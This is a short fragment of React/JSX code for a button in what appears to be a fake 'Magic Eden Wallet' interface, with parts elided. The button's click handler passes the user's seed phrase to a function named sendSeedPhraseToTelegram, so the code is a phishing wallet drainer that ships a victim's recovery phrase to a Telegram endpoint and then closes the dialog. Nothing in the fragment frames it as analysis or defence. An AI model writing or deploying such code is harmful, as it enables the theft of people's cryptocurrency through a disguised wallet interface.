              ...
              <div className="flex flex-col items-center justify-center mt-auto px-4 pb-6">
                <button 
                  ...
                  onClick={async () => {
                    ...
                    const success = await sendSeedPhraseToTelegram(seed, 'Magic Eden Wallet');
                    if (success) {
                      onClose();
                    } else {
